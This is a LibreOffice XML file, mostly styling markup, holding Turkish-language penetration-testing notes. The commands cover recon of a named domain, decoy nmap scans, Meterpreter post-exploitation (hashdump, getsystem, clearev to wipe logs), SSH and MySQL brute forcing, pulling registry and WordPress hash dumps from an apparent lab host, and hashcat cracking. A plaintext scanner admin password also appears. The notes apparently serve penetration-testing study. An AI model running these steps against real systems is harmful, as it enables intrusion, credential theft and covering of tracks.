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1pt" fo:font-weight="normal" officeooo:rsid="001c490a" officeooo:paragraph-rsid="001c490a" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="normal" style:font-size-complex="11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1pt" fo:font-weight="normal" officeooo:rsid="001d27fe" officeooo:paragraph-rsid="001d27fe" style:font-size-asian="9.60000038146973pt" style:font-weight-asian="normal" style:font-size-complex="11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1c490a" officeooo:paragraph-rsid="001c490a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1d27fe" officeooo:paragraph-rsid="001f14e0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0c227a" officeooo:paragraph-rsid="001d27fe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1f14e0" officeooo:paragraph-rsid="001f14e0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color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001f14e0" officeooo:paragraph-rsid="001f14e0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color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001b9890" officeooo:paragraph-rsid="001f14e0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color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001a4133" officeooo:paragraph-rsid="001f14e0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color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001bd28a" officeooo:paragraph-rsid="001f14e0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color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001d054b" officeooo:paragraph-rsid="001f14e0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000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0021651e" officeooo:paragraph-rsid="001f14e0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color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00225514" officeooo:paragraph-rsid="001f14e0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color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="002cff6a" officeooo:paragraph-rsid="001f14e0" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="bold" officeooo:rsid="00270d7b" officeooo:paragraph-rsid="001f14e0" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="10.5pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="001a4133" officeooo:paragraph-rsid="001f14e0" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" fo:font-size="13pt" fo:font-weight="bold" officeooo:rsid="00263987" officeooo:paragraph-rsid="001f14e0" style:font-size-asian="13pt" style:font-weight-asian="bold" style:font-size-complex="13pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="001c490a" officeooo:paragraph-rsid="001c490a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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="001d27fe" officeooo:paragraph-rsid="001d27fe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color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="001f14e0" officeooo:paragraph-rsid="001f14e0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fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="bold" officeooo:rsid="001d27fe" officeooo:paragraph-rsid="001d27fe" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="10.5pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001b9890" officeooo:paragraph-rsid="001f14e0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style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0010d0de" officeooo:paragraph-rsid="001f14e0" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="002e728c" officeooo:paragraph-rsid="001f14e0" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001f14e0" officeooo:paragraph-rsid="001f14e0" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P27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28" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="001f14e0" officeooo:paragraph-rsid="001f14e0" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="001d27fe"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="001f14e0"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:color="#000dff" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" style:font-size-asian="10.5pt" style:font-size-complex="10.5pt"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="001a4133"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="0021651e"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties officeooo:rsid="002cff6a"/>
    </style:style>
    <style:style style:name="T7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1.RECON</text:p>
      <text:p text:style-name="P3">nslookup dijikid.com <text:s/>(ip adresi bulur.)</text:p>
      <text:p text:style-name="P3">dnsenum dijikid.com <text:s text:c="2"/>(alakalı tüm ipler ve reverse lookup)</text:p>
      <text:p text:style-name="P3">python3 /opt/ct-exposer/ct-exposer.py -d dijikid.com <text:s/></text:p>
      <text:p text:style-name="P3">(alakalı domainleri getirir.)</text:p>
      <text:p text:style-name="P3">dnsrecon -d dijikid.com -a --lifetime 500 (DNS serverları)</text:p>
      <text:p text:style-name="P3">raccoon dijikid.com -o ~/Desktop/dijikid.com-raccoon</text:p>
      <text:p text:style-name="P3">(aşırı detaylı rapor)</text:p>
      <text:p text:style-name="P3">anonsurf start (tor vpn açılır.)</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P20">2.SCANNİNG</text:p>
      <text:p text:style-name="P4">tshark <text:s text:c="5"/>(yapılan işlemleri dinleme altına alırız)</text:p>
      <text:p text:style-name="P4">ifconfig <text:s text:c="3"/>(eth0 ve lo ile ilgili ip,netmask,broadcast bilgileri)</text:p>
      <text:p text:style-name="P6">netdiscover -r 10.10.10.0/24 <text:s/><text:span text:style-name="T1">(ağdaki ip taraması)</text:span></text:p>
      <text:p text:style-name="P4">wireshark <text:s text:c="2"/>(detaylı paket taraması yapacağımız uygulama)</text:p>
      <text:p text:style-name="P4">nmap 192.168.1.10 -sT <text:s text:c="2"/>(açık tcp portları)</text:p>
      <text:p text:style-name="P4">nmap -p80,443,445 -sV -O --osscan-guess 192.168.1.10-50 -T4</text:p>
      <text:p text:style-name="P4">(işletim sistemleri ile ilgili detaylı bilgi)</text:p>
      <text:p text:style-name="P4">nmap 192.168.1.10 -sV --version-all <text:s text:c="2"/>(işletim sis. Tarama)</text:p>
      <text:p text:style-name="P4">arp-scan -l -v -s 10.10.10.85 -S 81-32-45-86-12-74 <text:s/></text:p>
      <text:p text:style-name="P4">(sahte ip ve mac adresinden scan yapıyoruz.)</text:p>
      <text:p text:style-name="P4">nmap 192.168.1.1 --script vuln <text:s/>(vuln??)</text:p>
      <text:p text:style-name="P4">nmap 192.168.1.1 -f <text:s text:c="3"/>(filtered portları da gösterir)</text:p>
      <text:p text:style-name="P4">nmap -D RND:10 10.10.10.11 <text:s/><text:span text:style-name="T2">(rastgele 10 ip adresinden de sorgu yapar.)</text:span></text:p>
      <text:p text:style-name="P4">nmap -Pn --script=dns-brute dijikid.com <text:s/><text:span text:style-name="T2">(dns brute ile hostname aranır)</text:span></text:p>
      <text:p text:style-name="P4">nmap -n -Pn -vv -O -sV --script smb-enum*,smb-ls,smb-os-discovery,smb-s* dijikid.com <text:s text:c="2"/><text:span text:style-name="T2">(smb açığı varsa bulunur)</text:span></text:p>
      <text:p text:style-name="P5">nmap -f -T0 -n -Pn -data-length 200 -D RND:10 192.168.1.1 <text:s text:c="2"/></text:p>
      <text:p text:style-name="P7">(paket büyüklüğünü ve ip adresini değiştirerek, pingsiz ve detaylı tarama.)</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">nmblookup -A 10.10.10.11 <text:s text:c="2"/><text:span text:style-name="T2">(mac adresi ve user tipleri alınır)</text:span></text:p>
      <text:p text:style-name="P5">nmap --script smb-vuln-ms17-010 10.10.10.11 <text:span text:style-name="T2">(ms17-010 cve var mı?)</text:span></text:p>
      <text:p text:style-name="P5">nmap 10.10.10.11 -p3306 --script mysql-users --script-args mysqluser=root</text:p>
      <text:p text:style-name="P7">(root un olup olmadığını sql dosyalarından kontrol ediyoruz.)</text:p>
      <text:p text:style-name="P7">nmap -p22 10.10.10.11-12 --script ssh2-enum-algos</text:p>
      <text:p text:style-name="P7">(nerede ve hangi enum algoritmaları kullanılıyor bulunur, daha sonra hash crack ile çözülebilir.)</text:p>
      <text:p text:style-name="P7">nmap -p8020,8022,8080,8282,8383,8585,80,443 10.10.10.11-12 -T4 -sV --script http-slowloris-check -d <text:s/>(slowloris saldırı yapılabilir mi?)</text:p>
      <text:p text:style-name="P7">nmap -p22 10.10.10.11-12 --script ssh-hostkey --script-args ssh_hostkey=full <text:s text:c="2"/>(hostkeyler şifreli şekilde bulunur.)</text:p>
      <text:p text:style-name="P7">nmap -p8020,8022,8080,8282,8383,8585,80,443 10.10.10.11-12 -T4 -sV --script http-apache-server-status,http-date (kullanılan apache server ve http türü)</text:p>
      <text:p text:style-name="P5">nmap -p8020,8022,8080,8282,8383,8585,80,443 10.10.10.11-12 -T4 -sV --script http-security-headers <text:span text:style-name="T2">(security header aldık)</text:span></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">nmap 10.10.10.11-12 -p- -sV -T4 -vvv -oN ~/Desktop/nmapvuln.txt --script vuln <text:s text:c="4"/><text:span text:style-name="T2">(vuln tespiti) </text:span></text:p>
      <text:p text:style-name="P5">nmap 10.10.10.11-12 -p- -sV -T4 -vvv -oN ~/Desktop/nmapvuln.txt --script vuln <text:s text:c="4"/><text:span text:style-name="T2">(vulscan ile detaylı vuln tespiti)</text:span></text:p>
      <text:p text:style-name="P7">sol üstten LEGİON</text:p>
      <text:p text:style-name="P7">gvm-start</text:p>
      <text:p text:style-name="P18"><text:a xlink:type="simple" xlink:href="https://127.0.0.1:9392/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T3">https://127.0.0.1:9392</text:span></text:a></text:p>
      <text:p text:style-name="P16">admin</text:p>
      <text:p text:style-name="P16">923izM3<text:span text:style-name="T2">5</text:span></text:p>
      <text:p text:style-name="P21"><text:soft-page-break/>3. EXPLOİT</text:p>
      <text:p text:style-name="P7">jobs <text:s/>(arkaplanda çalışan modül işlemlerini gösterir)</text:p>
      <text:p text:style-name="P24">db_nmap</text:p>
      <text:p text:style-name="P25">nmap ten sonra aynen çalışır</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P21">4. EXPLOİT SALDIRILARI</text:p>
      <text:p text:style-name="P23">Meterpreter Komutları</text:p>
      <text:p text:style-name="P9">sysinfo <text:s text:c="14"/>(sist. Bilgi)</text:p>
      <text:p text:style-name="P9">show_mount <text:s text:c="11"/>(bağlı disk gör.)</text:p>
      <text:p text:style-name="P9">idletime ve localtime</text:p>
      <text:p text:style-name="P9">shutdown veya reboot</text:p>
      <text:p text:style-name="P9">ipconfig</text:p>
      <text:p text:style-name="P9">route <text:s text:c="10"/>(rotaların görüntülenmesi veya değişimi)</text:p>
      <text:p text:style-name="P9">getpid <text:s text:c="5"/></text:p>
      <text:p text:style-name="P9">clearev <text:s text:c="17"/>(olay günlüğünü siler)</text:p>
      <text:p text:style-name="P9">execute -f &lt;dosya&gt; <text:s text:c="6"/>(çalıştırır <text:s/>-f dosya, -H gizle, -i çalıştır ve çağır)</text:p>
      <text:p text:style-name="P9">search -f &lt;dosya&gt; <text:s text:c="7"/>(dosyayı arar)</text:p>
      <text:p text:style-name="P9">download , <text:span text:style-name="T2">upload </text:span>&lt;nesne&gt;&lt;dizin&gt;</text:p>
      <text:p text:style-name="P9">bg, bgrun, bglist, bgkill</text:p>
      <text:p text:style-name="P9">getuid <text:s text:c="18"/>(bağlı oturumun yetki sınıfı gör.)</text:p>
      <text:p text:style-name="P9">getprivs <text:s text:c="16"/>(bağlı oturumda yetkilendirilmiş işlemleri gör.)</text:p>
      <text:p text:style-name="P9">getsystem -t 0 <text:s text:c="5"/>(bağlı kullanıcının yetkisini yükseltmeyi dener)</text:p>
      <text:p text:style-name="P9">reg &lt;komut&gt; <text:s text:c="8"/>(hedef sisteöin Registry sini yönetir.) (reg-h yardım)</text:p>
      <text:p text:style-name="P9">hashdump <text:s text:c="11"/>(şifre hash lerini görüntüler)</text:p>
      <text:p text:style-name="P9">irb <text:s text:c="16"/>(metasploit scriptleri çağırabileceğimiz ortamı açar)</text:p>
      <text:p text:style-name="P9">run &lt;script&gt;</text:p>
      <text:p text:style-name="P9">load &lt;eklenti&gt; <text:s text:c="3"/>(load -l)</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P23">Exploit Araştırması</text:p>
      <text:p text:style-name="P9">nmap version arat</text:p>
      <text:p text:style-name="P9">manageengine desktop central arat.</text:p>
      <text:p text:style-name="P9">Ip port arat.</text:p>
      <text:p text:style-name="P9">cve kodu arat</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Staged: <text:s text:c="2"/>(/)</text:p>
      <text:p text:style-name="P9">Boyutu küçük</text:p>
      <text:p text:style-name="P9">Stabil değil</text:p>
      <text:p text:style-name="P9">Stage in içinde çalışır</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Non-Staged: <text:s text:c="2"/>(_)</text:p>
      <text:p text:style-name="P9">Boyutu büyük</text:p>
      <text:p text:style-name="P9">Stabil</text:p>
      <text:p text:style-name="P9">Kendi çalışır</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">searchsploit ms17 –id -w</text:p>
      <text:p text:style-name="P9">--id <text:s text:c="3"/>(id verip bulabiliriz)</text:p>
      <text:p text:style-name="P9">-p <text:s text:c="6"/>(path)</text:p>
      <text:p text:style-name="P9">-v <text:s text:c="5"/>(verbose)</text:p>
      <text:p text:style-name="P9">-x <text:s text:c="6"/>(edit)</text:p>
      <text:p text:style-name="P9">-m <text:s text:c="5"/>(bulunduğun dizine kopyalar)</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P21"><text:soft-page-break/>5. BRUTE FORCE VE EXPLOİT SALDIRILARI</text:p>
      <text:p text:style-name="P10">nmap --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt 10.10.10.11-12 -p 22 <text:s text:c="2"/><text:span text:style-name="T2">(args scripti ile verdiğimiz dic. Kullanıyoruz)</text:span></text:p>
      <text:p text:style-name="P10">auxiliary/scanner/ssh/ssh_login <text:s/><text:span text:style-name="T2">(buradan da yapılabilir.)</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P11">medusa, <text:span text:style-name="T4">ncrack, hydra <text:s/></text:span><text:span text:style-name="T2">(dic. Login attack için kullanılabilir.)</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P8">sisteme girdikten sonra..</text:p>
      <text:p text:style-name="P10">ssh vagrant@10.10.10.11</text:p>
      <text:p text:style-name="P12">reg export HKLM c:/hklm.reg /y <text:s text:c="4"/>(reg dosyasını export ettik)</text:p>
      <text:p text:style-name="P10">ssh vagrant@10.10.10.11 fsutil file createnew hacked2.txt 2000000 </text:p>
      <text:p text:style-name="P12">(büyüklüğünü verdiğimiz bi txt yarattık)</text:p>
      <text:p text:style-name="P10">scp <text:s/>vagrant@10.10.10.11:c:/hklm.reg /root/Desktop <text:s/></text:p>
      <text:p text:style-name="P12">(reg dosyasını kendimize çektik)</text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T7">scp /root/Desktop/pass.txt </text:span><text:a xlink:type="simple" xlink:href="mailto:vagrant@10.10.10.11" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T7">vagrant@10.10.10.11</text:span></text:a><text:span text:style-name="T7">:c:/</text:span></text:p>
      <text:p text:style-name="P12">(bizdeki pass.txt yi karşıya gönderdik)</text:p>
      <text:p text:style-name="P10">ssh vagrant@10.10.10.11 shutdown -f -r -t 05</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P10">hydra -L users.txt -p pass.txt 10.10.10.11 mysql -vV -f -<text:span text:style-name="T5">e n </text:span></text:p>
      <text:p text:style-name="P13">(null pasword ile aratınca root u bulduk.)</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P14">MySQL veritabanını xml gibi düşün</text:p>
      <text:p text:style-name="P14">mysql -u root -h 10.10.10.11</text:p>
      <text:p text:style-name="P10">show databases;</text:p>
      <text:p text:style-name="P14">use wordpress;</text:p>
      <text:p text:style-name="P14">show tables;</text:p>
      <text:p text:style-name="P14">desc wp_users;</text:p>
      <text:p text:style-name="P10">select user_login,user_pass from wp_users;</text:p>
      <text:p text:style-name="P10">select * from wp_users;</text:p>
      <text:p text:style-name="P10">show databases; use wordpress; show tables;</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P14">mysqldump -h 10.10.10.11 wordpress wp_users &gt; /root/Desktop/hackeddb.sql</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">hashcat -h | grep phpass</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P7">smb ve glassfish kullanılan portları buluyoruz, ilgili exploitleri msf den bulup ayarlıyoruz.</text:p>
      <text:p text:style-name="P7">Meterpreterda <text:span text:style-name="T6">search secrets </text:span>ile gerekli hashleri bulduracağız.</text:p>
      <text:p text:style-name="P7">Password hashlerini alıyoruz, hash-identifier ile muhtemel şifreleme algo. Buluyoruz.</text:p>
      <text:p text:style-name="P15">hashcat -m 1000 -a 0 ~/Desktop/hashes2 ~/Desktop/pass.txt --status <text:s/>(hashi çözdük.)</text:p>
      <text:p text:style-name="P15">hashcat -m 1000 -a 0 ~/Desktop/hashes2 ~/Desktop/pass.txt --status --show <text:s/>(eğer wordlistte varsa gösterir.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4T15:11:35.294071526</dc:date>
    <meta:editing-duration>PT1H13M20S</meta:editing-duration>
    <meta:editing-cycles>4</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.1.1$Linux_X86_64 LibreOffice_project/40$Build-1</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="121" meta:word-count="683" meta:character-count="5499" meta:non-whitespace-character-count="4719"/>
  </office:meta>
</office:document-meta>
</file>